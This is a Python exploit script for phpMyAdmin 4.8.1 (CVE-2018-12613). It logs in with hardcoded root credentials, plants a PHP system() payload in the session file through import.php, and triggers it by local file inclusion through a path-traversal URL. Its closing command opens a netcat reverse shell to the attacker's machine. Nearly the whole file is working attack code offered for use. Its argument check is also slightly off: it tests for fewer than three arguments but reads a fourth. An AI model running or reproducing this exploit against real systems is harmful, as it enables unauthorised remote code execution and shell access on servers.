# Exploit Title: phpMyAdmin 4.8.1 - Remote Code Execution (RCE)
# Date: 17/08/2021
# Exploit Author: samguy
# Vulnerability Discovery By: ChaMd5 & Henry Huang
# Vendor Homepage: http://www.phpmyadmin.net
# Software Link: https://github.com/phpmyadmin/phpmyadmin/archive/RELEASE_4_8_1.tar.gz
# Version: 4.8.1
# Tested on: Linux - Debian Buster (PHP 7.3)
# CVE : CVE-2018-12613

#!/usr/bin/env python

import re, requests, sys

# check python major version
if sys.version_info.major == 3:
  import html
else:
  from six.moves.html_parser import HTMLParser
  html = HTMLParser()

if len(sys.argv) < 3:
  usage = """Usage: {} [ipaddr] [port] [path] [local_ip]
Example: {} 192.168.56.101 80 /phpMyAdmin-4.8.1-all-languages 192.168.56.1
"""
  print(usage.format(sys.argv[0],sys.argv[0]))
  exit()

def get_token(content):
  try:
    s = re.search('token"\s*value="(.*?)"', content)
    token = html.unescape(s.group(1))
    return token
  except Exception as e:
    print(f"Error extracting token: {e}")
    exit()

ipaddr = sys.argv[1]
port = sys.argv[2]
path = sys.argv[3]
local_ip = sys.argv[4]
url = "http://{}:{}{}".format(ipaddr, port, path)

def login(ipaddr, port, path):
  try:
    url1 = url + "/index.php"
    r = requests.get(url1)
    content = r.content.decode('utf-8')
    if r.status_code != 200:
      print("Unable to find the version")
      exit()

    s = re.search('PMA_VERSION:"(\d+\.\d+\.\d+)"', content)
    version = s.group(1)
    if version not in ["4.8.0", "4.8.1"]:
      print(f"The target is not exploitable (version: {version})")
      exit()

    cookies = r.cookies
    token = get_token(content)

    p = {'token': token, 'pma_username': "root", 'pma_password': "mazapan"}
    r = requests.post(url1, cookies=cookies, data=p)
    content = r.content.decode('utf-8')
    s = re.search('logged_in:(\w+),', content)
    logged_in = s.group(1)
    if logged_in == "false":
      print("Authentication failed")
      exit()

    cookies = r.cookies
    token = get_token(content)
    return cookies, token

  except requests.RequestException as e:
    print(f"HTTP request error during login: {e}")
    exit()
  except Exception as e:
    print(f"Unexpected error during login: {e}")
    exit()

def execute_command(command, cookies, token):
  try:
    url2 = url + "/import.php"
    payload = '''select '<?php system("{}") ?>';'''.format(command)
    p = {'table': '', 'token': token, 'sql_query': payload}
    r = requests.post(url2, cookies=cookies, data=p)
    if r.status_code != 200:
      print("Query failed")
      exit()

    session_id = cookies.get_dict()['phpMyAdmin']
    url3 = url + f"/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_{session_id}"
    r = requests.get(url3, cookies=cookies)
    if r.status_code != 200:
      print("Exploit failed")
      exit()

    content = r.content.decode('utf-8', errors="replace")
    s = re.search("select '(.*?)\n'", content, re.DOTALL)
    if s is not None:
      print("Command Output:")
      print(s.group(1))
    else:
      print("Opening shell.")
  except requests.RequestException as e:
    print(f"HTTP request error during command execution: {e}")
  except Exception as e:
    print(f"Unexpected error during command execution: {e}")

try:
  command = f"mkfifo /tmp/f; nc {local_ip} 5500 < /tmp/f | /bin/bash > /tmp/f 2>&1; rm /tmp/f;"
  cookies, token = login(ipaddr, port, path)
  execute_command(command, cookies, token)
except Exception as e:
  print(f"An unexpected error occurred: {e}")
